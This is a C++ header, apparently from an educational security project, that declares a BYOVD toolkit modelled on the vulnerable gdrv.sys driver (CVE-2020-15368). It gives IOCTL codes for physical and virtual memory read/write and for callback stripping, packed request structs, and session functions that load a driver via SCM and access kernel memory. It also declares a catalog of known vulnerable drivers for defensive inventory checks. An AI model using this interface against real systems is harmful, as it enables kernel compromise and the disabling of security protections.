// vulnerable_driver.hpp — BYOVD catalog + session for T2 kernel memory access.
//
// LESSON: BYOVD leaves a loaded-module hash, SCM records, device objects, and
// IOCTL telemetry. Defenders should block known vulnerable drivers before load.
// This stack implements both the offensive session path and the catalog used
// by blue-team inventory checks.
//
// IOCTL codes and request layouts match code/drivers/example_vulnerable
// (gdrv.sys educational pattern, CVE-2020-15368).

#pragma once

#include "real/error.hpp"
#include "real/kernel/driver_loader.hpp"
#include "real/kernel/ioctl_interface.hpp"

#include <cstddef>
#include <cstdint>
#include <string>
#include <vector>

namespace real::kernel::byovd {

// ── gdrv educational IOCTL codes (vuln_driver.c) ───────────────────

constexpr std::uint32_t IOCTL_GDRV_PHYS_READ = 0xC3502000u;
constexpr std::uint32_t IOCTL_GDRV_PHYS_WRITE = 0xC3502004u;
constexpr std::uint32_t IOCTL_GDRV_VIRT_READ = 0xC3502008u;
constexpr std::uint32_t IOCTL_GDRV_VIRT_WRITE = 0xC350200Cu;
constexpr std::uint32_t IOCTL_GDRV_ENTITY_WALK = 0xC3502010u;
constexpr std::uint32_t IOCTL_GDRV_PROCESS_SCAN = 0xC3502014u;
constexpr std::uint32_t IOCTL_GDRV_CALLBACK_STRIP = 0xC3502018u;
constexpr std::uint32_t IOCTL_GDRV_MODULE_LIST = 0xC350201Cu;

#pragma pack(push, 1)
struct GdrvPhysReq {
  std::uint64_t phys_addr = 0;
  std::uint32_t size = 0;
  std::uint32_t reserved = 0;
};

struct GdrvVirtReq {
  std::uint64_t process_id = 0;
  std::uint64_t target_address = 0;
  std::uint64_t output_buffer = 0;
  std::uint32_t size = 0;
  std::uint32_t flags = 0;
};
#pragma pack(pop)

static_assert(sizeof(GdrvPhysReq) == 16, "GdrvPhysReq must match vuln_driver.c");
static_assert(sizeof(GdrvVirtReq) == 32, "GdrvVirtReq must match vuln_driver.c");

/// Pack a PHYS_READ / PHYS_WRITE header (data payload appended by caller for write).
std::vector<std::uint8_t> pack_gdrv_phys_req(std::uint64_t phys_addr, std::uint32_t size);

/// Pack a VIRT_READ / VIRT_WRITE request; output_buffer is a usermode pointer.
std::vector<std::uint8_t> pack_gdrv_virt_req(std::uint32_t pid, std::uint64_t address,
                                             std::uint32_t size, std::uint64_t output_buffer);

struct VulnerableDriverInfo {
  std::string name;
  std::string original_filename;
  std::string sha256_hash;
  std::uint16_t vendor_id = 0;
  std::uint16_t product_id = 0;
  bool is_signed = false;
  bool has_mem_read = false;
  bool has_mem_write = false;
  bool has_process_protection = false;
  std::string cve_id;
  std::string description;
};

struct ByovdSession {
  std::string driver_name;
  DriverLoadResult load_result;
  DeviceHandle device;
  VulnerableDriverInfo driver_info;
  bool session_active = false;
  bool we_loaded_driver = false;

  Result<std::vector<std::uint8_t>> read_kernel_memory(std::uint64_t address, std::size_t size);
  Result<std::vector<std::uint8_t>> read_process_memory(std::uint32_t pid, std::uint64_t address,
                                                        std::size_t size);
  Result<void> write_kernel_memory(std::uint64_t address, const std::vector<std::uint8_t>& data);
  Result<std::uint64_t> get_process_cr3(std::uint32_t pid);
  Result<void> close();
};

Result<std::vector<VulnerableDriverInfo>> known_vulnerable_drivers();
Result<VulnerableDriverInfo> find_vulnerable_driver(const std::string& name);
Result<VulnerableDriverInfo> check_loaded_vulnerable_driver();

/// Establish a BYOVD session: reuse a loaded vulnerable driver device, or
/// load `preferred_image_path` via SCM when provided. Tries gdrv device paths
/// consistent with the in-repo educational driver.
Result<ByovdSession> establish_byovd_session(const std::string& preferred_image_path = {});

/// Device path candidates for a catalog entry (pure; no I/O).
std::vector<std::string> byovd_device_path_candidates(const VulnerableDriverInfo& info);

/// Primary IOCTL set for a catalog entry (gdrv codes when name matches gdrv).
struct DriverIoctlSet {
  std::uint32_t phys_read = IOCTL_GDRV_PHYS_READ;
  std::uint32_t phys_write = IOCTL_GDRV_PHYS_WRITE;
  std::uint32_t virt_read = IOCTL_GDRV_VIRT_READ;
  std::uint32_t virt_write = IOCTL_GDRV_VIRT_WRITE;
};

DriverIoctlSet ioctl_set_for_driver(const VulnerableDriverInfo& info);

}  // namespace real::kernel::byovd
